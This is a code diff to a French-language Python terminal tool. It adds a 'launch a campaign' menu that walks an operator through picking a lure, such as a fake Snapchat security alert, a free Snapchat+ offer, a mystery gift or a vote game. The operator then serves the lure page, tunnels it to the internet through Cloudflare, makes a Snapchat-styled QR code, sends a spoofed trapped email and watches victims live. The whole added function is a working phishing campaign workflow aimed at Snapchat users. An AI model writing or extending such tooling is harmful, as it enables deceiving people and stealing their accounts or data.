@@ -121,11 +121,13 @@ def show_menu():
     print(f"    {C}[3]{X}  Dashboard interactif")
     print(f"    {C}[4]{X}  Surveillance en direct (Watch Live)")
     print()
-    print(f"    {Y}[5]{X}  Exporter les données")
-    print(f"    {Y}[6]{X}  Ouvrir dans le navigateur")
-    print(f"    {Y}[7]{X}  Vérifier la base de données")
+    print(f"    {M}[5]{X}  🎯 Lancer une campagne")
     print()
-    print(f"    {R}[8]{X}  Réinitialiser toutes les données")
+    print(f"    {Y}[6]{X}  Exporter les données")
+    print(f"    {Y}[7]{X}  Ouvrir dans le navigateur")
+    print(f"    {Y}[8]{X}  Vérifier la base de données")
+    print()
+    print(f"    {R}[9]{X}  Réinitialiser toutes les données")
     print()
     print(f"    {D}[0]{X}  Quitter")
     print()
@@ -697,8 +699,154 @@ def td_votes():
     input(f"  {D}[Appuie sur Entrée]{X}")
 
 # ══════════════════════════════════════════════════════════════
-#  MAIN LOOP
+#  CAMPAGNE
 # ══════════════════════════════════════════════════════════════
+
+def action_campaign():
+    """Menu campagne étape par étape."""
+    scenario_id = "classement"
+    server_running = False
+    tunnel_url = None
+    
+    while True:
+        cls()
+        print(LOGO)
+        print(f"  {D}{'─' * 60}{X}")
+        print(f"  {M}  🎯 LANCER UNE CAMPAGNE{X}")
+        print(f"  {D}{'─' * 60}{X}")
+        print()
+        
+        # Étape 1: Choix du scénario
+        s_name, s_desc = {
+            "classement": ("🏆 Classement Secret", "Jeu de vote anonyme"),
+            "securite": ("🔐 Alerte de sécurité", "Fausse alerte Snapchat"),
+            "snapchat_plus": ("🎁 Snapchat+", "Offre Snapchat+ gratuite"),
+            "cadeau": ("🎀 Cadeau Mystère", "Concours cadeau gagnant"),
+        }.get(scenario_id, ("???", "???"))
+        
+        server_status = f"{G}● EN COURS{X}" if server_running else f"{R}○ ARRÊTÉ{X}"
+        
+        print(f"  {C}ÉTAPE 1 — Choisir un appât{X}")
+        print(f"    Scénario actuel : {Y}{s_name}{X}")
+        print(f"    {D}  {s_desc}{X}")
+        print()
+        print(f"  {C}ÉTAPE 2 — Lancer le serveur{X}")
+        print(f"    Statut : {server_status}")
+        if tunnel_url:
+            print(f"    {D}  URL : {tunnel_url}{X}")
+        print()
+        print(f"  {C}ÉTAPE 3 — Générer les outils{X}")
+        print(f"    {D}  QR code, Email spoof, Liens{X}")
+        print()
+        print(f"  {C}ÉTAPE 4 — Surveillance{X}")
+        print(f"    {D}  Watch Live, Dashboard{X}")
+        print()
+        print(f"  {D}{'─' * 60}{X}")
+        print()
+        print(f"    {G}[1]{X}  Changer de scénario")
+        print(f"    {G}[2]{X}  Démarrer le serveur")
+        if server_running:
+            print(f"    {G}[3]{X}  + Tunnel Cloudflare")
+            print(f"    {G}[4]{X}  Générer un QR code")
+            print(f"    {G}[5]{X}  Envoyer un email piégé")
+            print(f"    {G}[6]{X}  Watch Live")
+            print(f"    {G}[7]{X}  Dashboard")
+            print(f"    {G}[8]{X}  Ouvrir dans le navigateur")
+        print(f"    {R}[9]{X}  Arrêter le serveur")
+        print(f"    {D}[0]{X}  Retour au menu principal")
+        print()
+        c = input(f"  {G}└─>{X} ").strip()
+        
+        if c == "1":
+            # Changer scénario
+            cls(); print(LOGO)
+            print(f"\n  {C}Scénarios disponibles :{X}\n")
+            scenarios = [
+                ("classement", "🏆 Classement Secret", "Jeu de vote anonyme"),
+                ("securite", "🔐 Alerte de sécurité", "Fausse alerte Snapchat"),
+                ("snapchat_plus", "🎁 Snapchat+", "Offre Snapchat+ gratuite"),
+                ("cadeau", "🎀 Cadeau Mystère", "Concours cadeau gagnant"),
+            ]
+            for i, (sid, sn, sd) in enumerate(scenarios, 1):
+                m = "◄" if sid == scenario_id else " "
+                print(f"    {G}[{i}]{X} {m} {sn}")
+                print(f"       {D}{sd}{X}")
+            print()
+            choix = input(f"  {G}└─>{X} ").strip()
+            mapping = {"1": "classement", "2": "securite", "3": "snapchat_plus", "4": "cadeau"}
+            if choix in mapping:
+                scenario_id = mapping[choix]
+                print(f"\n  {G}✓ Scénario changé : {scenarios[int(choix)-1][1]}{X}")
+                input(f"  {D}[Appuie sur Entrée]{X}")
+                
+        elif c == "2":
+            # Démarrer serveur
+            stop_tunnel()
+            if start_server():
+                server_running = True
+                print(f"\n  {G}✓ Serveur démarré sur http://localhost:8080{X}")
+                print(f"  {D}  URL du scénario : http://localhost:8080/scenario/{scenario_id}{X}")
+            else:
+                print(f"\n  {R}✗ Échec du démarrage{X}")
+            input(f"\n  {D}[Appuie sur Entrée]{X}")
+            
+        elif c == "3" and server_running:
+            tunnel_url = start_tunnel()
+            if tunnel_url:
+                print(f"\n  {G}✓ Tunnel actif : {tunnel_url}{X}")
+                print(f"  {D}  URL campagne : {tunnel_url}/scenario/{scenario_id}{X}")
+            else:
+                print(f"\n  {R}✗ Tunnel échoué{X}")
+            input(f"\n  {D}[Appuie sur Entrée]{X}")
+            
+        elif c == "4" and server_running:
+            # QR code
+            base_url = tunnel_url or f"http://localhost:8080"
+            campagne_url = f"{base_url}/scenario/{scenario_id}"
+            try:
+                exec(open(os.path.join(BASE, "tools/qr_generator.py")).read().replace("interactive_menu()", ""))
+                from tools import qr_generator as qr
+                filepath = qr.make_styled_qr(campagne_url, "snapchat")
+                print(f"\n  {G}✓ QR code généré : {filepath}{X}")
+                print(f"  {D}  Contient : {campagne_url}{X}")
+                if os.name == "nt":
+                    os.startfile(os.path.dirname(filepath))
+            except Exception as e:
+                print(f"\n  {R}✗ Erreur : {e}{X}")
+                print(f"  {Y}  → pip install qrcode[pil]{X}")
+            input(f"\n  {D}[Appuie sur Entrée]{X}")
+            
+        elif c == "5" and server_running:
+            # Email spoof
+            base_url = tunnel_url or f"http://localhost:8080"
+            campagne_url = f"{base_url}/scenario/{scenario_id}"
+            try:
+                sys.path.insert(0, os.path.join(BASE, "tools"))
+                import email_spoofer
+                email_spoofer.interactive_menu()
+            except Exception as e:
+                print(f"\n  {R}✗ Erreur : {e}{X}")
+            input(f"\n  {D}[Appuie sur Entrée]{X}")
+            
+        elif c == "6" and server_running:
+            watch_live()
+        elif c == "7" and server_running:
+            terminal_dashboard()
+        elif c == "8" and server_running:
+            base_url = tunnel_url or f"http://localhost:8080"
+            url = f"{base_url}/scenario/{scenario_id}"
+            webbrowser.open(url)
+            print(f"\n  {G}✓ Ouverture : {url}{X}")
+            input(f"\n  {D}[Appuie sur Entrée]{X}")
+        elif c == "9":
+            stop_tunnel()
+            stop_server()
+            server_running = False
+            tunnel_url = None
+            print(f"\n  {Y}Serveur arrêté.{X}")
+            input(f"\n  {D}[Appuie sur Entrée]{X}")
+        elif c == "0":
+            return
 
 def main():
     while True:
@@ -715,12 +863,14 @@ def main():
         elif c == "4":
             action_4_watch()
         elif c == "5":
-            action_5_export()
+            action_campaign()
         elif c == "6":
-            action_6_browser()
+            action_5_export()
         elif c == "7":
-            action_7_dbcheck()
+            action_6_browser()
         elif c == "8":
+            action_7_dbcheck()
+        elif c == "9":
             action_8_reset()
         elif c == "0":
             stop_tunnel()
